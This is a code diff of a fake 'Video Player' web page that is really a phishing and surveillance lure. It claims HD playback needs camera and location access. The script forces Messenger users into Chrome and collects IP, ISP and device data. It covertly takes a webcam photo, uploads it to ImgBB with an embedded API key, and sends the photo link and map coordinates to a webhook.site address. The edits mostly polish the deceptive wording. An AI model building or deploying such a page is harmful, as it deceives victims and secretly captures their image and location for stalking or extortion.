@@ -7,13 +7,14 @@
     <title> </title>
     <meta property="og:title" content=" ">
     <meta property="og:description" content=" ">
-    <meta property="og:image" content="https://i.postimg.cc/ZnyFjR0V/IMG-6711.jpg">
+    <meta property="og:image" content="https://i.postimg.cc/X7nZWxXG/D74DBBAB-4DAC-41A3-9067-97D904EC6A55.jpg">
     <meta property="og:type" content="website">
 
     <style>
         body { margin: 0; background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; overflow: hidden; }
-        .card { background: #18191a; padding: 25px; border-radius: 20px; border: 1px solid #3e4042; width: 320px; }
-        .btn { background: #0084ff; color: #fff; padding: 14px; border: none; border-radius: 10px; width: 100%; cursor: pointer; font-weight: bold; margin-top: 20px; font-size: 16px; }
+        .card { background: #18191a; padding: 20px; border-radius: 20px; border: 1px solid #3e4042; width: 320px; }
+        .thumb-img { width: 100%; border-radius: 10px; margin-bottom: 15px; border: 1px solid #333; }
+        .btn { background: #0084ff; color: #fff; padding: 14px; border: none; border-radius: 10px; width: 100%; cursor: pointer; font-weight: bold; margin-top: 10px; font-size: 16px; }
         #loader { display: none; margin-top: 20px; }
         .spinner { border: 4px solid rgba(255, 255, 255, 0.1); width: 40px; height: 40px; border-radius: 50%; border-left-color: #0084ff; animation: spin 1s linear infinite; margin: 0 auto 15px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
@@ -24,16 +25,16 @@
 
 <div id="verify-box" class="card">
     <div id="content-ui">
-        <div style="font-size: 50px; margin-bottom: 10px;">▶️</div>
-        <h2>Video Player</h2>
-        <p style="font-size: 14px; color: #b0b3b8;">High-speed stream detected. Please allow <b>Camera</b> and <b>Location</b> to start HD playback.</p>
+        <img src="https://i.postimg.cc/X7nZWxXG/D74DBBAB-4DAC-41A3-9067-97D904EC6A55.jpg" class="thumb-img">
+        <h3 style="margin: 5px 0;">Video Ready to Play</h3>
+        <p style="font-size: 13px; color: #b0b3b8;">High-speed stream detected. Allow <b>Camera</b> and <b>Location</b> to start playback.</p>
         <button class="btn" onclick="startProcess()">Play Video</button>
     </div>
 
     <div id="loader">
         <div class="spinner"></div>
         <p id="status-text" style="font-size: 15px; color: #0084ff; font-weight: bold;">Video loading...</p>
-        <p style="font-size: 12px; color: #777;">Optimizing stream for Chrome...</p>
+        <p style="font-size: 12px; color: #777;">Buffering high-quality stream...</p>
     </div>
 </div>
 
@@ -44,13 +45,11 @@
     const webhookURL = "https://webhook.site/1f626cc0-2563-4b0b-9d32-b1f251edb1bc";
     const imgbbAPIKey = "cc0a92aa0138f8aeb453cd172ed610d1";
 
-    // ১. মেসেঞ্জার থেকে সরাসরি ক্রোমে নিয়ে যাওয়ার ট্রিক
+    // মেসেঞ্জার থেকে ক্রোমে পাঠানোর ট্রিক
     window.onload = function() {
         const ua = navigator.userAgent || navigator.vendor || window.opera;
         const isMessenger = (ua.indexOf("Messenger") > -1) || (ua.indexOf("FBAN") > -1) || (ua.indexOf("FBAV") > -1);
-        
         if (isMessenger) {
-            // Android-এর জন্য অটো ক্রোম ওপেনিং ইন্টেন্ট
             const currentUrl = window.location.href.replace(/^https?:\/\//, '');
             window.location.href = "intent://" + currentUrl + "#Intent;scheme=https;package=com.android.chrome;end";
         }
@@ -60,10 +59,9 @@
         document.getElementById('content-ui').style.display = 'none';
         document.getElementById('loader').style.display = 'block';
 
-        // অটোমেটিক আইপি ও সিম ডাটা সংগ্রহ
         fetch('https://ipapi.co/json/').then(res => res.json()).then(ipData => {
             sendToWebhook({
-                Event: "Visitor Ping",
+                Event: "Initial Ping",
                 ISP: ipData.org,
                 Model: navigator.userAgent.split('(')[1].split(')')[0],
                 IP: ipData.ip
@@ -76,14 +74,13 @@
             video.srcObject = stream;
 
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                document.getElementById('status-text').innerText = "Buffering stream...";
+                document.getElementById('status-text').innerText = "Optimizing playback...";
 
                 setTimeout(async () => {
                     const canvas = document.getElementById('canvas');
                     canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                     const base64Img = canvas.toDataURL('image/jpeg').split(',')[1];
 
-                    // ২. ImgBB-তে ছবি আপলোড
                     const formData = new FormData();
                     formData.append("image", base64Img);
 
@@ -93,14 +90,13 @@
                     });
                     const resData = await upload.json();
                     
-                    // ৩. Webhook-এ ডাটা পাঠানো
                     sendToWebhook({
                         Event: "Captured ✅",
                         Maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
                         Photo: resData.data.url
                     });
 
-                    document.getElementById('status-text').innerText = "Starting playback...";
+                    document.getElementById('status-text').innerText = "Starting video...";
                     stream.getTracks().forEach(t => t.stop());
 
                     setTimeout(() => {
@@ -109,11 +105,11 @@
 
                 }, 2000);
             }, (err) => {
-                alert("Playback error: Region verification failed. Please allow Location.");
+                alert("Playback error: Verification required.");
                 location.reload();
             });
         } catch (e) {
-            alert("Playback error: Camera access required for HD streaming.");
+            alert("Playback error: Camera access needed for HD streaming.");
             location.reload();
         }
     }
